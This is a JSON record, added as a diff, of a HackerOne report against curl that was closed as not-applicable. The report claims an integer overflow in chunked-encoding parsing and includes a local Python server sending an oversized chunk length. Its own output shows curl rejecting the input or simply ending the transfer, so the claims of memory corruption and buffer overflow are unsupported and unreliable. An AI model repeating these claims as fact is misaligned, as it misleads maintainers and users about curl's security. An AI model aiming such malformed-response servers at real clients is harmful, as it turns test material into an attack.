@@ -1,0 +1,135 @@
+{
+  "id": 3344663,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMzQ0NjYz",
+  "url": "https://hackerone.com/reports/3344663",
+  "title": "Security Analysis Report: CURL Integer Overflow Vulnerability",
+  "state": "Closed",
+  "substate": "not-applicable",
+  "readable_substate": "N/A",
+  "created_at": "2025-09-17T19:53:15.610Z",
+  "submitted_at": "2025-09-17T19:53:15.879Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "mohiq",
+    "url": "/mohiq",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/0qp03epmt8m31rm21140clfrnkd9/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 35663,
+    "url": "https://hackerone.com/curl",
+    "handle": "curl",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "curl",
+      "twitter_handle": "",
+      "website": "https://curl.se",
+      "about": "cURL is an Open Source project providing a library and command-line tool doing internet transfers"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2025-09-18T09:33:39.052Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2025-09-18T06:08:30.893Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "1. Vulnerability Overview\nVulnerability Type: Integer Overflow in HTTP chunked encoding\nLocation in Source:\n```\nlib/http_chunks.c (line 173)\nlib/curlx/strparse.c (lines 185–186)\n```\nImpact:\nInteger overflow leads to memory corruption\nCan cause buffer overflow\nResults in Denial of Service (DoS) for curl\nPotential for information disclosure under controlled conditions\nCode Snippet Demonstrating the Issue\n```\n// http_chunks.c line 173\nif(curlx_str_hex(&p, &ch->datasize, CURL_OFF_T_MAX)) {\n    // Error handling\n}\n// strparse.c lines 185-186\nif(num > ((max - n) / base))\n    return STRE_OVERFLOW;\nnum = num * base + n;\n```\n\nProblem:\nThe overflow check can be bypassed when max = CURL_OFF_T_MAX (0x7FFFFFFFFFFFFFFF). This allows num to exceed the maximum value without triggering the overflow protection, leading to memory corruption when curl processes chunked responses.\n\n\nTest Setup\nPython test server simulating vulnerable behavior:\n\n```\n#!/usr/bin/env python3\n\nimport socket\nimport threading\n\ndef create_test_response():\n    overflow_chunk_size = \"7FFFFFFFFFFFFFFFF\"\n    \n    html_content = \"<html><body><h1>Overflow Test Page</h1><p>If you see this, curl continued reading.</p></body></html>\"\n    \n    response = (\n        \"HTTP/1.1 200 OK\\r\\n\"\n        \"Transfer-Encoding: chunked\\r\\n\"\n        \"Content-Type: text/html\\r\\n\"\n        \"Connection: close\\r\\n\"\n        \"\\r\\n\"\n        f\"{overflow_chunk_size}\\r\\n\"  \n        \"VULNERABILITY_PROOF_DATA\\r\\n\"  \n        f\"{len(html_content):X}\\r\\n\"  \n        f\"{html_content}\\r\\n\"  \n        \"0\\r\\n\"  \n        \"\\r\\n\"\n    )\n    return response.encode()\ndef handle_client(client_socket, addr):\n    print(f\"[+] Connection from {addr}\")\n    try:\n        request = client_socket.recv(1024)\n        print(f\"[+] Sending test response with overflow and HTML chunk...\")\n        response = create_test_response()\n        client_socket.send(response)\n        print(f\"[+] Response sent!\")\n    except Exception as e:\n        print(f\"[-] Error: {e}\")\n    finally:\n        client_socket.close()\ndef start_test_server():\n    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n    \n    try:\n        server.bind(('127.0.0.1', 8080))\n        server.listen(5)\n        print(\"=\" * 60)\n        print(\"CURL INTEGER OVERFLOW TEST CONTINUATION \")\n        print(\"=\" * 60)\n        print(\"Server running on port 8080\")\n        print(\"After sending overflow chunk, HTML chunk will follow\")\n        print(\"Run: curl  http://127.0.0.1:8080\")\n        print(\"=\" * 60)\n        \n        while True:\n            client_socket, addr = server.accept()\n            client_thread = threading.Thread(target=handle_client, args=(client_socket, addr))\n            client_thread.daemon = True\n            client_thread.start()\n    except KeyboardInterrupt:\n        print(\"\\n[+] Server stopped\")\n    finally:\n        server.close()\n\nif __name__ == \"__main__\":\n    start_test_server()\n\n\n```\ncurl  http://127.0.0.1:8080\n\nF1:F4796194\n\nchrome\nF1:F4796193\n\n\noverflow_chunk_size = \"7FFFFFFFFFFFFFFFF\" \n```\n└─$ curl http://127.0.0.1:8080\ncurl: (56) chunk hex-length longer than 16\n\n```\n\n\noverflow_chunk_size = \"7FFFFFFFFFFFFFFF\" \n\n```\n└─$ curl http://127.0.0.1:8080\nVULNERABILITY_PROOF_DATA\n64\n<html><body><h1>Overflow Test Page</h1><p>If you see this, curl continued reading.</p></body></html>\n0\ncurl: (18) transfer closed with outstanding read data remaining\n└─$ \n```\n\n## Impact\n\nInteger overflow leads to memory corruption\nCan cause buffer overflow\nResults in Denial of Service (DoS) for curl\nPotential for information disclosure under controlled conditions\nCode Snippet Demonstrating the Issue",
+  "weakness": {
+    "id": 15,
+    "name": "Integer Overflow"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 4796193,
+      "file_name": "curl2.PNG",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/drkz61juwh100fw6993hjwmnml7n?response-content-disposition=attachment%3B%20filename%3D%22curl2.PNG%22%3B%20filename%2A%3DUTF-8%27%27curl2.PNG&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQY7DRSLTF%2F20260502%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260502T163236Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHkaCXVzLXdlc3QtMiJGMEQCIEHZaYHpJ%2FthSz8pY9acIWSCh9bdizSTHTPUCtxlK8NbAiA7zhPmItwFf8%2FQvWOsxQFvYZ8OaJnA9TFpRvJiS7WfJSqyBQhBEAMaDDAxMzYxOTI3NDg0OSIMay8Do63pGp1DLyhKKo8F2t3xOTw3GwPV29Ctt7H4E4NIiEmm6mtoz7xVioAVv4syaDq0pu2TStSJ6LNfNV86AOFoEl00daMUqLeKUlxMZEr178Lv0ho2Ami8w%2BM%2FNyVNUThcgJZG3%2BI%2BIqYw%2Bxtu97SSZ9pVOAtKv9Nko%2BcNN3gvvzREkuv5b4JR3deyHCLMceFMUADB3xlLLa8z34RZvjQr4nSvfuhGBbOzyVYQVVgoS0wxPveg8lLDvkJjQsppyNmHXItugvGZxWsqXfv%2BnwhWce3XS26Nfvbq%2BYV0lQgSsUiYicXpRheeYbVcaC%2BR%2FixBvUn1focOVf4vsV2k%2FUvbBRCv0hepxsy3yYjXKDVvr%2BphddKB%2BB5fQIIWxgpmKXbP9ijRfTvFOtZuBhcivllftEkB%2F4poRiF88sZPI1bwxCuo15XY5SmwsY0Ur%2B5katVYyiNpQOv7Q2Q32kXz6fuClNQQvHRZtzeZsGZkql9xPhLa9CYf33eO7x%2F1WsVNcW2YZbNY%2BFEat2KmBKyDqmybhrdKQjhoO7riDOaDSdOdqwTDuenJMrK6N7KYbklk69Ifre%2FuGGpmAL7QnkMGuTS6foerZEi4EfYu1RRgZTWqHaTIYSNljkmdzP3piPJ14uUuE3yBkAiDNoFbaGS3C8Iuk%2BiKAcW5Nm6OtV3kt3LgJlUk%2FBDIeWZskG3l6aqLADnlC5FZkYWRZiPGR%2FYT0Zw9oilXzMQSkxrcSgFpLj7X6bcVv1CTCLOqnKXL651ra6uxCuVd0AoO56KlQBSdA2f%2FtMxzZWopYSraj4GHXZvpAWii3GH%2BquA7mUDXSyPk55wFu3elpfBC7N9tLyT%2Fd%2Fdh5cHMae3qB4XP0JdBps6A%2B9SNGXVdDold0%2BSusjDJx9jPBjqyAeRSmkWzn5lactRPIQMopB3E5YzMa3oT9wCQ1YUZtu19GSfelYez1Q5Tv3Iv24AtPcXDFvXENhhN01OhSfczxxYiH9iaiJw7s0oPTG7sMNSf%2B2nwoyishkYD%2BHd1PdnjaLoIo6o2iSivfgCZY3M0pNh%2FTGAcgcCaeMN%2F18qhG1Dnltd2Ox6o9UPnP7quqmycgHpQgMSsH3VIgD%2BSo%2FwvNzq4df5edlhkJyAriEnVo4pqZQ4%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=c45817bdcdc7ed7d667a148d7b0759521cc7a89664102f9c8ea6aa587e7f0db6",
+      "file_size": 20220,
+      "type": "image/png",
+      "moderated": false
+    },
+    {
+      "id": 4796194,
+      "file_name": "curl1.PNG",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/ad2cysckbh9996tswpffiqmd6163?response-content-disposition=attachment%3B%20filename%3D%22curl1.PNG%22%3B%20filename%2A%3DUTF-8%27%27curl1.PNG&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQY7DRSLTF%2F20260502%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260502T163236Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHkaCXVzLXdlc3QtMiJGMEQCIEHZaYHpJ%2FthSz8pY9acIWSCh9bdizSTHTPUCtxlK8NbAiA7zhPmItwFf8%2FQvWOsxQFvYZ8OaJnA9TFpRvJiS7WfJSqyBQhBEAMaDDAxMzYxOTI3NDg0OSIMay8Do63pGp1DLyhKKo8F2t3xOTw3GwPV29Ctt7H4E4NIiEmm6mtoz7xVioAVv4syaDq0pu2TStSJ6LNfNV86AOFoEl00daMUqLeKUlxMZEr178Lv0ho2Ami8w%2BM%2FNyVNUThcgJZG3%2BI%2BIqYw%2Bxtu97SSZ9pVOAtKv9Nko%2BcNN3gvvzREkuv5b4JR3deyHCLMceFMUADB3xlLLa8z34RZvjQr4nSvfuhGBbOzyVYQVVgoS0wxPveg8lLDvkJjQsppyNmHXItugvGZxWsqXfv%2BnwhWce3XS26Nfvbq%2BYV0lQgSsUiYicXpRheeYbVcaC%2BR%2FixBvUn1focOVf4vsV2k%2FUvbBRCv0hepxsy3yYjXKDVvr%2BphddKB%2BB5fQIIWxgpmKXbP9ijRfTvFOtZuBhcivllftEkB%2F4poRiF88sZPI1bwxCuo15XY5SmwsY0Ur%2B5katVYyiNpQOv7Q2Q32kXz6fuClNQQvHRZtzeZsGZkql9xPhLa9CYf33eO7x%2F1WsVNcW2YZbNY%2BFEat2KmBKyDqmybhrdKQjhoO7riDOaDSdOdqwTDuenJMrK6N7KYbklk69Ifre%2FuGGpmAL7QnkMGuTS6foerZEi4EfYu1RRgZTWqHaTIYSNljkmdzP3piPJ14uUuE3yBkAiDNoFbaGS3C8Iuk%2BiKAcW5Nm6OtV3kt3LgJlUk%2FBDIeWZskG3l6aqLADnlC5FZkYWRZiPGR%2FYT0Zw9oilXzMQSkxrcSgFpLj7X6bcVv1CTCLOqnKXL651ra6uxCuVd0AoO56KlQBSdA2f%2FtMxzZWopYSraj4GHXZvpAWii3GH%2BquA7mUDXSyPk55wFu3elpfBC7N9tLyT%2Fd%2Fdh5cHMae3qB4XP0JdBps6A%2B9SNGXVdDold0%2BSusjDJx9jPBjqyAeRSmkWzn5lactRPIQMopB3E5YzMa3oT9wCQ1YUZtu19GSfelYez1Q5Tv3Iv24AtPcXDFvXENhhN01OhSfczxxYiH9iaiJw7s0oPTG7sMNSf%2B2nwoyishkYD%2BHd1PdnjaLoIo6o2iSivfgCZY3M0pNh%2FTGAcgcCaeMN%2F18qhG1Dnltd2Ox6o9UPnP7quqmycgHpQgMSsH3VIgD%2BSo%2FwvNzq4df5edlhkJyAriEnVo4pqZQ4%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=56c5f1d374b07d589bbe5e2ddbbc0fb7af35ec217fa2615b1e6d638d6de7cb86",
+      "file_size": 125135,
+      "type": "image/png",
+      "moderated": false
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 26,
+  "voters": [
+    "jmo740",
+    "2026",
+    "wefega",
+    "neuralnexuslab",
+    "gilnet",
+    "hayder790",
+    "foxvr",
+    "neuralphantom",
+    "resolvedtech",
+    "khoale",
+    "and 16 more..."
+  ],
+  "structured_scope": {
+    "databaseId": 18844,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/curl/curl",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
